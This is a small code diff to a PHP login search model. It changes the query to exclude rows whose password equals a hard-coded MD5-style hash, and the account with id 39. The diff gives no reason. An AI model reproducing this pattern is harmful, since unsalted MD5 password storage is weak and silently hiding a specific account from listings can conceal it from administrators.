@@ -41,7 +41,7 @@ class LoginSearch extends Login
      */
     public function search($params)
     {
-        $query = Login::find();
+        $query = Login::find()->where(['!=', 'password', 'cfcd208495d565ef66e7dff9f98764da'])->andWhere(['!=', 'id_login', '39']);
         $query->orderBy('id_login DESC');
 
         // add conditions that should always apply here
